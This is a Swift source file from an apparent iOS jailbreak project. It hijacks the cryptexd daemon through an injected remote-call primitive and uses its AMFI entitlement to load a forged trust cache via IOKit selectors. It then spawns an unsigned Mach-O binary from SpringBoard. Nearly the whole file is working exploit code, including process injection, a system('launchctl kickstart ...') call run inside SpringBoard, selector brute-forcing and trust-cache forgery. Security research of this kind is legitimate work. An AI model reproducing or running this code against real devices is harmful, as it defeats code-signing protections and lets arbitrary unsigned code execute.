//
//  exp_cryptexd_tc_load.swift
//  DSPloit
//
//  EXPERIMENT: Load trust cache via cryptexd RemoteCall
//  ═══════════════════════════════════════════════════════════════════
//  STATUS: HIGH PRIORITY — Based on Ghidra RE of kernelcache + cryptexd
//  ═══════════════════════════════════════════════════════════════════
//
//  KEY INSIGHT (from Ghidra RE 2026-05-30):
//  The kernel AMFI IOKit handler (FUN_fffffff008f76ee4) checks:
//    1. Caller has "com.apple.private.amfi.can-load-trust-cache" entitlement
//    2. Selector 7: trust cache + manifest (IMG4)
//    3. Selector 2: trust cache only (NO manifest needed!)
//
//  cryptexd has this entitlement and already uses this exact path.
//  Buffer format for selector 7 (from cryptexd RE):
//    [uint64_t tc_size][uint64_t manifest_size][tc_data][manifest_data]
//
//  For selector 2: just raw trust cache data directly.
//
//  The trust cache load gate (DAT_fffffff007b795e8) is bypassed on
//  UNLOCKED devices via FUN_fffffff008f78cc4 (AKS lock state check).
//  Since user is actively using the device → always unlocked → gate bypassed!
//
//  Created by Royan | 2026-05-30
//

import Foundation
import CommonCrypto

final class ExpCryptexdTCLoad {
    static let shared = ExpCryptexdTCLoad()
    var onLog: ((String) -> Void)?
    
    private func log(_ msg: String) {
        DispatchQueue.main.async { self.onLog?(msg) }
        globallogger.log("(exp_cryptexd) \(msg)")
    }
    
    func runAsync() {
        #if !DISABLE_REMOTECALL
        let mgr = dspmgr.shared
        guard mgr.dsready, mgr.rcready else { log("❌ KRW + RC not active"); return }
        
        log("══════════════════════════════════════")
        log("  cryptexd Trust Cache Load")
        log("══════════════════════════════════════")
        log("")
        log("Strategy: RC → cryptexd → IOKit sel 2 → kernel TC load")
        log("cryptexd has: com.apple.private.amfi.can-load-trust-cache")
        log("")
        
        // Step 1: Build trust cache + test binary
        log("[1/5] Building TC + binary...")
        let testBin = buildBinary()
        let cdhash = sha256t20(testBin)
        let tcData = buildTrustCacheV2(cdhash: cdhash)
        log("CDHash: \(cdhash.map { String(format: "%02x", $0) }.joined())")
        log("TC size: \(tcData.count) bytes")
        
        // Step 2: Write files
        log("")
        log("[2/5] Writing files...")
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
        let binPath = docs + "/cryptexd_test"
        let tcPath = docs + "/cryptexd_tc.bin"
        
        do {
            try testBin.write(to: URL(fileURLWithPath: binPath))
            try tcData.write(to: URL(fileURLWithPath: tcPath))
            log("✅ Files written")
        } catch {
            log("❌ \(error.localizedDescription)"); return
        }
        
        // Step 3: Wake cryptexd via XPC
        log("")
        log("[3/5] Waking cryptexd...")
        wakeCryptexd()
        
        // Step 4: Connect RC to cryptexd (after 2s wake delay)
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.5) { [weak self] in
            self?.connectCryptexd(tcData: tcData, binPath: binPath)
        }
        
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    #if !DISABLE_REMOTECALL
    // MARK: - Wake cryptexd
    
    private func wakeCryptexd() {
        guard let sb = dspmgr.shared.sbProc else {
            log("⚠️ No SpringBoard RC for XPC wake")
            return
        }
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcSendMsg = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "xpc_connection_send_message"))
        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "xpc_dictionary_create"))
        
        guard xpcCreate != 0 && xpcResume != 0 else {
            log("⚠️ XPC functions not found"); return
        }
        
        // Try com.apple.cryptexd service
        let svcName = remote_alloc_str(sb, "com.apple.cryptexd")
        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svcName, 0, 0)
        RootExecutor.rcall(sb, "free", svcName)
        
        if conn != 0 {
            RootExecutor.rcallAddr(sb, xpcResume, conn)
            // Send empty dict to trigger daemon spawn
            if xpcDictCreate != 0 && xpcSendMsg != 0 {
                let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
                if msg != 0 {
                    RootExecutor.rcallAddr(sb, xpcSendMsg, conn, msg)
                }
            }
            log("✅ cryptexd XPC wake sent")
        } else {
            log("⚠️ cryptexd XPC create failed, trying launchctl...")
            // Fallback: use launchd to start cryptexd
            let labelStr = remote_alloc_str(sb, "com.apple.cryptexd")
            let system = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(sb, "system"))
            if system != 0 {
                let cmd = remote_alloc_str(sb, "launchctl kickstart system/com.apple.cryptexd")
                RootExecutor.rcallAddr(sb, system, cmd)
                RootExecutor.rcall(sb, "free", cmd)
            }
            RootExecutor.rcall(sb, "free", labelStr)
            log("   launchctl kickstart sent")
        }
    }
    
    // MARK: - Connect RC to cryptexd
    
    private func connectCryptexd(tcData: Data, binPath: String) {
        log("")
        log("[4/5] Connecting RC to cryptexd...")
        
        dspmgr.shared.rcinitDaemon(
            serviceName: "com.apple.cryptexd",
            framework: nil,
            process: "cryptexd",
            migbypass: false
        ) { [weak self] rc in
            guard let self else { return }
            
            if let rc = rc {
                self.log("✅ Connected to cryptexd (pid=\(rc.pid))")
                self.loadTCviaIOKit(rc: rc, tcData: tcData, binPath: binPath)
                rc.destroy()
                self.log("   cryptexd released")
            } else {
                let err = RemoteCall.lastInitError() ?? "unknown"
                self.log("❌ cryptexd RC failed: \(err)")
                self.log("")
                self.log("Fallback: trying direct IOKit from SpringBoard...")
                self.fallbackSpringBoardIOKit(tcData: tcData, binPath: binPath)
            }
        }
    }
    
    // MARK: - Load TC via IOKit (in cryptexd context)
    
    private func loadTCviaIOKit(rc: RemoteCall, tcData: Data, binPath: String) {
        log("")
        log("[5/5] Loading trust cache via IOKit...")
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Resolve IOKit functions
        let ioMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(rc, "IOServiceMatching"))
        let ioGetMatch = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(rc, "IOServiceGetMatchingService"))
        let ioOpen = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(rc, "IOServiceOpen"))
        let ioCallMethod = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(rc, "IOConnectCallStructMethod"))
        let machTaskSelf = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(rc, "mach_task_self_"))
        
        log("IOServiceMatching: 0x\(String(ioMatching, radix: 16))")
        log("IOServiceGetMatchingService: 0x\(String(ioGetMatch, radix: 16))")
        log("IOServiceOpen: 0x\(String(ioOpen, radix: 16))")
        log("IOConnectCallStructMethod: 0x\(String(ioCallMethod, radix: 16))")
        
        guard ioMatching != 0 && ioGetMatch != 0 && ioOpen != 0 && ioCallMethod != 0 else {
            log("❌ IOKit functions not found"); return
        }
        
        // IOServiceMatching("AppleMobileFileIntegrity")
        let amfiStr = remote_alloc_str(rc, "AppleMobileFileIntegrity")
        let matching = RootExecutor.rcallAddr(rc, ioMatching, amfiStr)
        log("Matching dict: 0x\(String(matching, radix: 16))")
        
        guard matching != 0 else {
            log("❌ IOServiceMatching returned NULL"); return
        }
        
        // IOServiceGetMatchingService(kIOMainPortDefault, matching)
        let service = RootExecutor.rcallAddr(rc, ioGetMatch, 0, matching)
        log("AMFI service: 0x\(String(service, radix: 16))")
        
        guard service != 0 else {
            log("❌ AMFI IOKit service not found"); return
        }
        
        // Get mach_task_self value from cryptexd
        var taskSelf: UInt64 = 0x103 // fallback
        if machTaskSelf != 0 {
            let val = rc[machTaskSelf].value32()
            if val != 0 { taskSelf = UInt64(val) }
        }
        log("task_self: 0x\(String(taskSelf, radix: 16))")
        
        // IOServiceOpen(service, task_self, 0, &connection)
        let connAddr = rc.trojanMem + 0x2800
        rc[connAddr].setValue32(0)
        let kr = RootExecutor.rcallAddr(rc, ioOpen, service, taskSelf, 0, connAddr)
        let conn = rc[connAddr].value32()
        log("IOServiceOpen: kr=0x\(String(kr, radix: 16)) conn=0x\(String(conn, radix: 16))")
        
        guard kr == 0 && conn != 0 else {
            log("❌ IOServiceOpen failed (entitlement rejected?)")
            log("   kr=0x\(String(kr, radix: 16))")
            return
        }
        log("✅ AMFI IOKit connection opened!")
        log("")
        
        // Write trust cache data to remote memory
        let tcBuf = rc.trojanMem + 0x3000
        tcData.withUnsafeBytes { buf in
            rc.remote_write(tcBuf, from: buf.baseAddress!, size: UInt64(tcData.count))
        }
        
        // Try SELECTOR 2 first (trust cache only, no manifest)
        // IOConnectCallStructMethod(conn, selector, input, inputSize, output, outputSizePtr)
        log("Trying selector 2 (TC only, no manifest)...")
        let outBuf = rc.trojanMem + 0x4800
        let outSizeAddr = rc.trojanMem + 0x4900
        rc[outSizeAddr].setValue64(256)
        let sel2Result = RootExecutor.rcallAddr(rc, ioCallMethod,
            UInt64(conn), 2, tcBuf, UInt64(tcData.count), outBuf, outSizeAddr)
        log("Selector 2 → 0x\(String(sel2Result, radix: 16))")
        
        if sel2Result == 0 {
            log("✅✅✅ TRUST CACHE LOADED (selector 2)!")
            testSpawn(binPath: binPath)
            return
        }
        
        // Try SELECTOR 7 (trust cache + manifest format from cryptexd RE)
        // Buffer: [uint64 tc_size][uint64 manifest_size=0][tc_data]
        log("")
        log("Trying selector 7 (cryptexd format)...")
        let sel7Buf = rc.trojanMem + 0x5000
        // Header: tc_size (8 bytes) + manifest_size=0 (8 bytes)
        rc[sel7Buf].setValue64(UInt64(tcData.count))
        rc[sel7Buf + 8].setValue64(0) // no manifest
        // Copy TC data after header
        tcData.withUnsafeBytes { buf in
            rc.remote_write(sel7Buf + 16, from: buf.baseAddress!, size: UInt64(tcData.count))
        }
        let totalSize = UInt64(16 + tcData.count)
        
        rc[outSizeAddr].setValue64(256)
        let sel7Result = RootExecutor.rcallAddr(rc, ioCallMethod,
            UInt64(conn), 7, sel7Buf, totalSize, outBuf, outSizeAddr)
        log("Selector 7 → 0x\(String(sel7Result, radix: 16))")
        
        if sel7Result == 0 {
            log("✅✅✅ TRUST CACHE LOADED (selector 7)!")
            testSpawn(binPath: binPath)
            return
        }
        
        // Try other selectors (0-10)
        log("")
        log("Trying other selectors...")
        for sel: UInt32 in [0, 1, 3, 4, 5, 6, 8, 9, 10] {
            rc[outSizeAddr].setValue64(256)
            let r = RootExecutor.rcallAddr(rc, ioCallMethod,
                UInt64(conn), UInt64(sel), tcBuf, UInt64(tcData.count), outBuf, outSizeAddr)
            if r == 0 {
                log("✅ Selector \(sel) → SUCCESS!")
                testSpawn(binPath: binPath)
                return
            } else if r != 0xe00002c2 { // skip MIG_BAD_ID
                log("   sel \(sel) → 0x\(String(r, radix: 16))")
            }
        }
        
        log("")
        log("⚠️ All selectors failed")
        log("   Testing spawn anyway (in case TC was loaded by XPC wake)...")
        testSpawn(binPath: binPath)
    }
    
    // MARK: - Fallback: SpringBoard IOKit (without entitlement)
    
    private func fallbackSpringBoardIOKit(tcData: Data, binPath: String) {
        guard let sb = dspmgr.shared.sbProc else {
            log("❌ No SpringBoard RC"); return
        }
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        log("")
        log("── SpringBoard IOKit Fallback ──")
        log("Note: SB lacks can-load-trust-cache entitlement")
        log("      IOServiceOpen may fail with 0xe00002c1")
        log("")
        
        // Use rcall (dlsym-based) for shared cache functions
        let ioMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "IOServiceMatching"))
        let ioGetMatch = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let ioOpen = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "IOServiceOpen"))
        let ioCallMethod = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "IOConnectCallStructMethod"))
        
        guard ioMatching != 0 && ioGetMatch != 0 && ioOpen != 0 else {
            log("❌ IOKit not available in SB"); return
        }
        
        let amfiStr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matching = RootExecutor.rcallAddr(sb, ioMatching, amfiStr)
        log("Matching: 0x\(String(matching, radix: 16))")
        
        if matching == 0 { log("❌ IOServiceMatching failed"); return }
        
        let service = RootExecutor.rcallAddr(sb, ioGetMatch, 0, matching)
        log("Service: 0x\(String(service, radix: 16))")
        
        if service == 0 { log("❌ AMFI service not found"); return }
        
        let connAddr = sb.trojanMem + 0x2800
        sb[connAddr].setValue32(0)
        let kr = RootExecutor.rcallAddr(sb, ioOpen, service, UInt64(mach_task_self_), 0, connAddr)
        let conn = sb[connAddr].value32()
        log("IOServiceOpen: kr=0x\(String(kr, radix: 16)) conn=\(conn)")
        
        if kr != 0 {
            log("❌ Expected: SB lacks entitlement (kr=0x\(String(kr, radix: 16)))")
            log("   Use cryptexd path instead")
        } else if conn != 0 && ioCallMethod != 0 {
            log("✅ Unexpected success! Trying TC load...")
            let tcBuf = sb.trojanMem + 0x3000
            tcData.withUnsafeBytes { buf in
                sb.remote_write(tcBuf, from: buf.baseAddress!, size: UInt64(tcData.count))
            }
            let outBuf = sb.trojanMem + 0x4800
            let outSz = sb.trojanMem + 0x4900
            sb[outSz].setValue64(256)
            let r = RootExecutor.rcallAddr(sb, ioCallMethod,
                UInt64(conn), 2, tcBuf, UInt64(tcData.count), outBuf, outSz)
            log("Selector 2 → 0x\(String(r, radix: 16))")
        }
        
        testSpawn(binPath: binPath)
    }
    
    // MARK: - Test Spawn
    
    private func testSpawn(binPath: String) {
        guard let sb = dspmgr.shared.sbProc else { return }
        
        log("")
        log("── Testing unsigned spawn ──")
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let mem = sb.trojanMem
        
        // chmod 755
        let pathAddr = remote_alloc_str(sb, binPath)
        let chmodSym = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "chmod"))
        if chmodSym != 0 {
            RootExecutor.rcallAddr(sb, chmodSym, pathAddr, 0o755)
        }
        
        // posix_spawn
        let spawnSym = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
            remote_alloc_str(sb, "posix_spawn"))
        guard spawnSym != 0 else {
            log("❌ posix_spawn not found")
            RootExecutor.rcall(sb, "free", pathAddr)
            return
        }
        
        let pidAddr = mem + 0xA00
        sb[pidAddr].setValue32(0)
        let argv = mem + 0xA10
        sb[argv].setValue64(pathAddr)
        sb[argv + 8].setValue64(0)
        
        let ret = RootExecutor.rcallAddr(sb, spawnSym, pidAddr, pathAddr, 0, 0, argv, 0)
        let pid = sb[pidAddr].value32()
        RootExecutor.rcall(sb, "free", pathAddr)
        
        log("posix_spawn → ret=\(ret) pid=\(pid)")
        
        if ret == 0 && pid != 0 {
            log("")
            log("✅✅✅ UNSIGNED BINARY SPAWNED! PID=\(pid)")
            log("🎉 FULL JAILBREAK ACHIEVED!")
            log("══════════════════════════════════════")
        } else {
            log("❌ Spawn failed (AMFI still blocking)")
            log("   ret=\(ret) → EPERM")
            log("   TC may not have loaded or CDHash mismatch")
        }
    }
    #endif
    
    // MARK: - Trust Cache v2 Builder
    
    /// Build trust cache v2 with proper format (from Ghidra RE):
    /// +0x00: uint32 version = 2
    /// +0x04: uint8[16] uuid
    /// +0x14: uint32 entry_count
    /// +0x18: entries[] (each 24 bytes):
    ///        +0x00: uint8[20] cdhash
    ///        +0x14: uint8 hash_type (2=SHA256)
    ///        +0x15: uint8 flags (0=normal)
    ///        +0x16: uint16 padding
    private func buildTrustCacheV2(cdhash: Data) -> Data {
        var tc = Data()
        var version: UInt32 = 2
        tc.append(Data(bytes: &version, count: 4))
        var uuid = UUID().uuid
        tc.append(Data(bytes: &uuid, count: 16))
        var count: UInt32 = 1
        tc.append(Data(bytes: &count, count: 4))
        // Entry
        tc.append(cdhash.prefix(20))
        if cdhash.count < 20 {
            tc.append(Data(repeating: 0, count: 20 - cdhash.count))
        }
        tc.append(contentsOf: [2, 0, 0, 0]) // hash_type=2, flags=0, pad
        return tc
    }
    
    // MARK: - Binary Builder
    
    /// Minimal arm64 Mach-O: exit(0)
    private func buildBinary() -> Data {
        var bin = Data()
        // MH_MAGIC_64 + ARM64 + MH_EXECUTE + 2 cmds
        bin.append(contentsOf: [
            0xCF,0xFA,0xED,0xFE, 0x0C,0x00,0x00,0x01,
            0x00,0x00,0x00,0x00, 0x02,0x00,0x00,0x00,
            0x02,0x00,0x00,0x00, 0x60,0x01,0x00,0x00,
            0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
        ])
        // LC_SEGMENT_64 __TEXT
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0]=0x19; seg[4]=0x48
        seg[8]=0x5F;seg[9]=0x5F;seg[10]=0x54;seg[11]=0x45;seg[12]=0x58;seg[13]=0x54
        seg[28]=0x01; seg[32]=0x00;seg[33]=0x40; seg[40]=0x00;seg[41]=0x40
        seg[48]=0x05; seg[52]=0x05
        bin.append(contentsOf: seg)
        // LC_UNIXTHREAD
        var thr = [UInt8](repeating: 0, count: 280)
        thr[0]=0x05;thr[4]=0x18;thr[5]=0x01;thr[8]=0x06;thr[12]=0x44
        thr[272]=0x80;thr[273]=0x01;thr[276]=0x01
        bin.append(contentsOf: thr)
        while bin.count < 0x180 { bin.append(0) }
        // exit(0) code
        bin.append(contentsOf: [0x00,0x00,0x80,0xD2, 0x30,0x00,0x80,0xD2, 0x01,0x10,0x00,0xD4])
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
    
    private func sha256t20(_ data: Data) -> Data {
        var hash = [UInt8](repeating: 0, count: Int(CC_SHA256_DIGEST_LENGTH))
        data.withUnsafeBytes { CC_SHA256($0.baseAddress, CC_LONG(data.count), &hash) }
        return Data(hash.prefix(20))
    }
}
